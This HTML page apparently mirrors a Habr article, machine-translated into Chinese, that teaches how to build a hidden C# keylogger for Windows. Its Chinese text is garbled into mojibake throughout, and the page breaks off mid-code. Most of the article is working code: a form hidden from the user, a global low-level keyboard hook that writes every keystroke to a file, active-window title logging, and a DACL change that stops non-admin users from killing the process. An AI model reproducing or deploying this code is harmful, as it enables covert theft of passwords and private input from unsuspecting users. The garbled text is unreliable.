<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ§›ğŸ» ğŸ§šğŸ¾ â˜ğŸ» Windowsçš„Keyloggerï¼Œå…·æœ‰DACLä¸­çš„æƒåˆ©æ›´æ”¹ ğŸ‘— ğŸ‘ï¸ ğŸ‘©ğŸ½â€âš•ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†è€ƒè™‘åŸºäº.Net Cï¼ƒçš„Keyloggerçš„åˆ›å»ºä»¥åŠå¯¹ç³»ç»Ÿå‡½æ•°çš„è°ƒç”¨ã€‚ ç®€è¦æè¿°äº†ç³»ç»ŸåŠŸèƒ½æœ¬èº«ï¼Œä½†æœ€å¥½é˜…è¯»Microsoftçš„å®˜æ–¹æ–‡æ¡£ã€‚ æœ€åæä¾›äº†åˆ°å¸¦æœ‰å·¥ä½œç¨‹åºé›†çš„å­˜å‚¨åº“çš„é“¾æ¥ï¼Œä»¥åŠåˆ°æ–‡æ¡£çš„é“¾æ¥ã€‚ 

 å°†å®æ–½ä»€ä¹ˆï¼š 



- è®°å½•é”®ç›˜è¾“å…¥ã€‚ 
- è®°å½•æ´»åŠ¨çª—å£ã€‚ 
- åœ¨æ²¡æœ‰ç®¡ç†...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Windowsçš„Keyloggerï¼Œå…·æœ‰DACLä¸­çš„æƒåˆ©æ›´æ”¹</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/482644/"> åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†è€ƒè™‘åŸºäº.Net Cï¼ƒçš„<b>Keylogger</b>çš„åˆ›å»ºä»¥åŠå¯¹ç³»ç»Ÿå‡½æ•°çš„è°ƒç”¨ã€‚ ç®€è¦æè¿°äº†ç³»ç»ŸåŠŸèƒ½æœ¬èº«ï¼Œä½†æœ€å¥½é˜…è¯»Microsoftçš„å®˜æ–¹æ–‡æ¡£ã€‚ æœ€åæä¾›äº†åˆ°å¸¦æœ‰å·¥ä½œç¨‹åºé›†çš„å­˜å‚¨åº“çš„é“¾æ¥ï¼Œä»¥åŠåˆ°æ–‡æ¡£çš„é“¾æ¥ã€‚ <br><br> å°†å®æ–½ä»€ä¹ˆï¼š <br><br><ul><li> è®°å½•é”®ç›˜è¾“å…¥ã€‚ </li><li> è®°å½•æ´»åŠ¨çª—å£ã€‚ </li><li> åœ¨æ²¡æœ‰ç®¡ç†å‘˜ç‰¹æƒçš„æƒ…å†µä¸‹é˜»æ­¢æ¥è‡ªç”¨æˆ·çš„è¿›ç¨‹ã€‚ </li><li> é€šè¿‡é”®ç›˜å¿«æ·é”®åœæ­¢è¯¥è¿‡ç¨‹ã€‚ </li></ul><a name="habracut"></a><br> è¦ç¼–å†™ï¼Œæ‚¨å°†éœ€è¦Cï¼ƒï¼ŒWin APIå’ŒWindows DACLçš„çŸ¥è¯†ã€‚ <br><br> å› æ­¤ï¼Œæˆ‘ä»¬å°†åˆ†ææ‰€éœ€çš„å‡ ç§ç±»å‹çš„ç³»ç»Ÿä»£ç ï¼Œæ¯ç§ç±»å‹çš„ä»£ç å°†å­˜å‚¨åœ¨å•ç‹¬çš„Enumä¸­ã€‚ <br><br> é’©å­çš„ç±»å‹ã€‚ <br><br><pre><code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">enum</span></span> HookTypes { WH_CALLWNDPROC = <span class="hljs-number"><span class="hljs-number">4</span></span>, WH_CALLWNDPROCRET = <span class="hljs-number"><span class="hljs-number">12</span></span>, WH_KEYBOARD = <span class="hljs-number"><span class="hljs-number">2</span></span>, WH_KEYBOARD_LL = <span class="hljs-number"><span class="hljs-number">13</span></span>, WH_MOUSE = <span class="hljs-number"><span class="hljs-number">7</span></span>, WH_MOUSE_LL = <span class="hljs-number"><span class="hljs-number">14</span></span>, WH_JOURNALRECORD = <span class="hljs-number"><span class="hljs-number">0</span></span>, WH_JOURNALPLAYBACK = <span class="hljs-number"><span class="hljs-number">1</span></span>, WH_FOREGROUNDIDLE = <span class="hljs-number"><span class="hljs-number">11</span></span>, WH_SYSMSGFILTER = <span class="hljs-number"><span class="hljs-number">6</span></span>, WH_GETMESSAGE = <span class="hljs-number"><span class="hljs-number">3</span></span>, WH_CBT = <span class="hljs-number"><span class="hljs-number">5</span></span>, WH_HARDWARE = <span class="hljs-number"><span class="hljs-number">8</span></span>, WH_DEBUG = <span class="hljs-number"><span class="hljs-number">9</span></span>, WH_SHELL = <span class="hljs-number"><span class="hljs-number">10</span></span>, }</code> </pre> <br> è¦æ•è·ä¸é”®ç›˜æœ‰å…³çš„æ‰€æœ‰äº‹ä»¶ï¼Œæ‚¨éœ€è¦<b>WH_KEYBOARD_LL</b>ç±»å‹ã€‚ æ‰€æœ‰å…¶ä»–ç±»å‹çš„æŒ‚é’©éƒ½éœ€è¦å®ç°å•ç‹¬çš„DLLï¼Œä½†å¦ä¸€ä¸ª<b>WH_MOUSE_LL</b>æŒ‚é’©-ä¸é¼ æ ‡ç›¸å…³çš„äº‹ä»¶é™¤å¤–ã€‚ <br><br> ä¸é”®ç›˜ç›¸å…³çš„äº‹ä»¶ç±»å‹ï¼ŒæŒ‰ä¸‹å¹¶é‡Šæ”¾ä¸€ä¸ªé”®ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">enum</span></span> KeyboardEventTypes { WM_KEYDOWN = <span class="hljs-number"><span class="hljs-number">0x0100</span></span>, WM_KEYUP = <span class="hljs-number"><span class="hljs-number">0x0101</span></span>, }</code> </pre><br> æˆ‘ä»¬å°†é€šè¿‡é‡Šæ”¾é”®<b>-WM_KEYUP</b>æ¥è®°å½•è¾“å…¥å­—ç¬¦ã€‚ <br><br> å¦å¤–ï¼Œç”¨äºæ•è·ç”¨æˆ·ä»ä¸€ä¸ªåº”ç”¨ç¨‹åºçª—å£åˆ°å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºçª—å£çš„è¿‡æ¸¡çš„ç±»å‹ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">WinEventTypes</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint</span></span> WINEVENT_OUTOFCONTEXT = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint</span></span> EVENT_SYSTEM_FOREGROUND = <span class="hljs-number"><span class="hljs-number">3</span></span>; }</code> </pre><br> ä¸ºäº†ä½¿ç”¨é”®ç›˜å¿«æ·é”®è¿›è¡Œæšä¸¾ä»¥ç¦ç”¨è¯¥ç¨‹åºã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">enum</span></span> CombineKeys { MOD_ALT = <span class="hljs-number"><span class="hljs-number">0x1</span></span>, MOD_CONTROL = <span class="hljs-number"><span class="hljs-number">0x2</span></span>, MOD_SHIFT = <span class="hljs-number"><span class="hljs-number">0x4</span></span>, MOD_WIN = <span class="hljs-number"><span class="hljs-number">0x8</span></span>, WM_HOTKEY = <span class="hljs-number"><span class="hljs-number">0x0312</span></span>, }</code> </pre><br> ä¸ºäº†å®ç°æ‰€æœ‰è¦ç‚¹ï¼Œé¦–å…ˆåˆ›å»ºè¡¨å•å¹¶å°†å…¶å¯¹ç”¨æˆ·éšè—ã€‚ è¦†ç›–åŸºæœ¬çš„SetVisibleCoreæ–¹æ³•å°±è¶³å¤Ÿäº†ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SetVisibleCore</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">value</span></span></span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">base</span></span>.SetVisibleCore(<span class="hljs-literal"><span class="hljs-literal">false</span></span>); }</code> </pre><br> è¯¥ç¨‹åºå°†åœ¨å¯åŠ¨æ—¶å¯åŠ¨ã€‚ <br><br><pre> <code class="cs hljs">Application.Run(HiddenForm);</code> </pre> <br> æœ‰ä¸€ä¸ªè¡¨æ ¼ï¼Œç°åœ¨æ‚¨éœ€è¦æ·»åŠ ä¸»è¦åŠŸèƒ½-æ‹¦æˆªé”®ç›˜è¾“å…¥ã€‚ æˆ‘ä»¬ä½¿ç”¨Win API <b>SetWindowsHookEx</b>æ–¹æ³•ï¼Œå°†ä¼ é€’ä»¥ä¸‹å‚æ•°ï¼š <br><br><ul><li>  <b>æŒ‚é’©çš„ç±»å‹</b>ä¸ºWH_KEYBOARD_LLã€‚ </li><li>  <b>å›è°ƒå‡½æ•°</b> åº”è¯¥å¤„ç†ä¸é”®ç›˜æœ‰å…³çš„æ‰€æœ‰äº‹ä»¶çš„æ–¹æ³•ã€‚ </li><li>  <b>å½“å‰æ¨¡å—çš„ID</b> ã€‚ </li><li>  <b>çº¿ç¨‹æ ‡è¯†ç¬¦</b>ä¸º0ã€‚é›¶ï¼Œä»¥ä¾¿è¯¥æŒ‚é’©ä¸æ‰€æœ‰çº¿ç¨‹å…³è”ã€‚ </li></ul><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> IntPtr </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SetHook</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">HookTypes typeOfHook, HookProc callBack</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> (Process currentProcess = Process.GetCurrentProcess()) <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> (ProcessModule currentModule = currentProcess.MainModule) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SetWindowsHookEx((<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)typeOfHook, callBack, GetModuleHandle(currentModule.ModuleName), <span class="hljs-number"><span class="hljs-number">0</span></span>); } }</code> </pre><br> å¤„ç†é’©å­çš„æ–¹æ³•æœ¬èº«ã€‚ å®ƒå…·æœ‰å‡ ä¸ªå‚æ•°<b>nCode-</b>ä¸ºäº†äº†è§£æ˜¯å¤„ç†å½“å‰äº‹ä»¶è¿˜æ˜¯ç«‹å³ä¼ é€’äº‹ä»¶ï¼Œ <br>  <b>wParam-</b>äº‹ä»¶çš„ç±»å‹ï¼ˆæŒ‰ä¸‹æˆ–é‡Šæ”¾é”®ï¼‰ï¼Œ <b>lParam-</b>å½“å‰æŒ‰ä¸‹çš„å­—ç¬¦ã€‚ æœ¬è´¨ä¸Šï¼Œ <b>lParam</b>æ˜¯ä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼Œå› æ­¤ä¼šåœ¨å…¶ä¸­å­˜å‚¨å…¶ä»–ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·æŒ‰ä½é”®å¹¶ä¸”åœ¨å…¶ä¸Šæ‰§è¡Œå¤„ç†çš„æœºå™¨å¾ˆæ…¢ï¼Œåˆ™å­—ç¬¦æ•°ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> IntPtr </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">KeyLoggerHookCallback</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> nCode, IntPtr wParam, IntPtr lParam</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (nCode &gt;= <span class="hljs-number"><span class="hljs-number">0</span></span> &amp;&amp; wParam == (IntPtr)KeyboardEventTypes.WM_KEYUP) { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> vkCode = Marshal.ReadInt32(lParam); SetKeysState(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> saveText = GetSymbol((<span class="hljs-keyword"><span class="hljs-keyword">uint</span></span>)vkCode); File.AppendAllText(_fileName, saveText); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> CallNextHookEx(HookId, nCode, wParam, lParam); }</code> </pre><br> æ­¤å®ç°ä»…åœ¨ç”¨æˆ·é‡Šæ”¾é”®åæ‰å†™å…¥å­—ç¬¦ã€‚ è¦è®°å½•å­—ç¬¦æ•°ï¼Œæ‚¨éœ€è¦å®ç°<b>WM_KEYDOWN</b>ç±»å‹çš„å¤§å°å†™ã€‚ <br><br>  <b>SetKeysState</b>æ–¹æ³•ç”¨äºäº†è§£é™„åŠ é”®æ˜¯ä»€ä¹ˆçŠ¶æ€ï¼Œä¾‹å¦‚ï¼Œå½±å“å¤§å°å†™çš„é”®ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SetKeysState</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { _capsLock = GetKeyState((<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)Keys.CapsLock) != <span class="hljs-number"><span class="hljs-number">0</span></span>; _numLock = GetKeyState((<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)Keys.NumLock) != <span class="hljs-number"><span class="hljs-number">0</span></span>; _scrollLock = GetKeyState((<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)Keys.Scroll) != <span class="hljs-number"><span class="hljs-number">0</span></span>; _shift = GetKeyState((<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)Keys.ShiftKey) != <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre><br>  <b>GetKeyState</b>æ˜¯å¦ä¸€ä¸ªWin APIæ–¹æ³•ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•é€šè¿‡é”®ç æŸ¥æ‰¾çŠ¶æ€ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">string</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetSymbol</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint</span></span></span></span><span class="hljs-function"><span class="hljs-params"> vkCode</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> buff = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(maxChars); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> keyboardState = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[maxChars]; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> keyboard = GetKeyboardLayout( GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero)); ToUnicodeEx(vkCode, <span class="hljs-number"><span class="hljs-number">0</span></span>, keyboardState, buff, maxChars, <span class="hljs-number"><span class="hljs-number">0</span></span>, (IntPtr)keyboard); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> buffSymbol = buff.ToString(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> symbol = buffSymbol.Equals(<span class="hljs-string"><span class="hljs-string">"\r"</span></span>) ? Environment.NewLine : buffSymbol; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (_capsLock ^ _shift) symbol = symbol.ToUpperInvariant(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> symbol; }</code> </pre><br> åœ¨<b>GetSymbol</b>æ–¹æ³•ä¸­ï¼Œé¦–å…ˆè¯·æ±‚å½“å‰çª—å£çš„<b>GetKeyboardLayout</b>é”®ç›˜å¸ƒå±€ä»£ç ï¼Œç„¶åå†è¯·æ±‚<b>ToUnicodeEx</b>ä»¥è·å–å­—ç¬¦ï¼Œè¿™éƒ½æ˜¯Win APIæ–¹æ³•ã€‚ å¦‚æœæ¶‰åŠå½±å“å¤§å°å†™çš„é”®ï¼Œåˆ™å¿…é¡»å°†å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ã€‚ <br><br>  <u>è¿™è¶³ä»¥è®°å½•æ¥è‡ªé”®ç›˜çš„è¾“å…¥ã€‚</u> ä½†æ˜¯è¦è®°å½•å½“å‰çš„æ´»åŠ¨çª—å£ï¼Œæ‚¨éœ€è¦ä½¿ç”¨å¦ä¸€ä¸ªæŒ‚é’©ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> IntPtr </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SetWinHook</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">WinEventProc callBack</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> (Process currentProcess = Process.GetCurrentProcess()) <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> (ProcessModule currentModule = currentProcess.MainModule) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SetWinEventHook( WinEventTypes.EVENT_SYSTEM_FOREGROUND, WinEventTypes.EVENT_SYSTEM_FOREGROUND, GetModuleHandle(currentModule.ModuleName), callBack, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, WinEventTypes.WINEVENT_OUTOFCONTEXT); } }</code> </pre><br> éœ€è¦ç±»å‹<b>EVENT_SYSTEM_FOREGROUND</b>æ¥è·Ÿè¸ªæ´»åŠ¨çª—å£ä¸­çš„æ›´æ”¹ã€‚  <b>WINEVENT_OUTOFCONTEXT</b>è¡¨ç¤ºcallBackæ–¹æ³•åœ¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­ã€‚ <br><br> ä¼ é€’ç»™æŒ‚é’©é“¾çš„æ–¹æ³•åŒ…å«è®¸å¤šå‚æ•°ï¼Œè¿™äº›å‚æ•°åœ¨æ›´è¯¦ç»†çš„å®ç°ä¸­å¾ˆæœ‰ç”¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¶³ä»¥æ‰¾å‡ºæ´»åŠ¨çª—å£åŠå…¶æ ‡é¢˜ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ActiveWindowsHook</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params"> IntPtr hWinEventHook, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint</span></span></span></span><span class="hljs-function"><span class="hljs-params"> eventType, IntPtr hwnd, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> idObject, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> idChild, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint</span></span></span></span><span class="hljs-function"><span class="hljs-params"> dwEventThread, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint</span></span></span></span><span class="hljs-function"><span class="hljs-params"> dwmsEventTime</span></span></span><span class="hljs-function">)</span></span> { File.AppendAllText(_fileName, <span class="hljs-string"><span class="hljs-string">$"</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">{Environment.NewLine}</span></span></span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">{GetActiveWindowTitle()}</span></span></span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">{Environment.NewLine}</span></span></span><span class="hljs-string">"</span></span>); }</code> </pre><br> å³ï¼Œå°†è®°å½•æ¯ä¸ªçª—å£æ›´æ”¹äº‹ä»¶ã€‚ åœ¨<b>GetActiveWindowTitleä¸­</b> ï¼Œåªéœ€ä½¿ç”¨å‡ ä¸ªWin API <b>GetForegroundWindow</b>æ–¹æ³•<b>å°±</b>è¶³å¤Ÿäº†-åœ¨ä½¿ç”¨<b>GetWindowText</b>è¯·æ±‚æ ‡é¢˜åï¼Œæ‰¾å‡ºå½“å‰æ´»åŠ¨çª—å£çš„æ ‡è¯†ç¬¦ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">string</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetActiveWindowTitle</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> buff = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(maxChars); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> handle = GetForegroundWindow(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (GetWindowText(handle, buff, maxChars) &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> buff.ToString(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">null</span></span>; }</code> </pre><br> åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ‰€æœ‰ç³»ç»ŸåŠŸèƒ½è°ƒç”¨å‡æ¥è‡ª<b>User32</b>å’Œ<b>Kernel32</b>åº“ã€‚ ä¸‹ä¸€æ­¥æ˜¯ä½¿ç”¨<b>advapi32</b>åº“ã€‚ <br><br> ç¬¬ä¸‰æ­¥æ˜¯é˜²æ­¢æ™®é€šç”¨æˆ·å®Œæˆå½•åˆ¶é”®ç›˜è¾“å…¥çš„è¿‡ç¨‹ã€‚ é¦–å…ˆï¼Œæ‚¨éœ€è¦å¤„ç†æ­¤è¿‡ç¨‹ï¼Œç„¶åé€šè¿‡åœ¨<b>DACLä¸­</b>æ·»åŠ æ¡ç›®æ¥è¿›è¡Œæ›´æ”¹ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">BlockForNotAdminUsers</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hProcess = Process.GetCurrentProcess().Handle; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> securityDescriptor = GetProcessSecurityDescriptor(hProcess); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> sid = WindowsIdentity.GetCurrent().User.AccountDomainSid; securityDescriptor.DiscretionaryAcl.InsertAce( <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> CommonAce( AceFlags.None, AceQualifier.AccessDenied, (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)ProcessAccessRights.PROCESS_ALL_ACCESS, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SecurityIdentifier(WellKnownSidType.WorldSid, sid), <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-literal"><span class="hljs-literal">null</span></span>)); SetProcessSecurityDescriptor(hProcess, securityDescriptor); }</code> </pre><br> æµç¨‹æè¿°ç¬¦é€šè¿‡<b>GetKernelObjectSecurityæ¥æ”¶</b> ï¼Œè¯¥æ–¹æ³•è¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œé¦–å…ˆæˆ‘ä»¬è·å–æè¿°ç¬¦çš„é•¿åº¦ï¼Œå…¶æ¬¡æˆ‘ä»¬ç›´æ¥è·å–æµç¨‹æè¿°ç¬¦ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> RawSecurityDescriptor </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetProcessSecurityDescriptor</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">IntPtr processHandle</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> psd = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>]; GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint</span></span> bufSizeNeeded); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bufSizeNeeded &lt; <span class="hljs-number"><span class="hljs-number">0</span></span> || bufSizeNeeded &gt; <span class="hljs-keyword"><span class="hljs-keyword">short</span></span>.MaxValue) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Win32Exception(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!GetKernelObjectSecurity( processHandle, DACL_SECURITY_INFORMATION, psd = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span 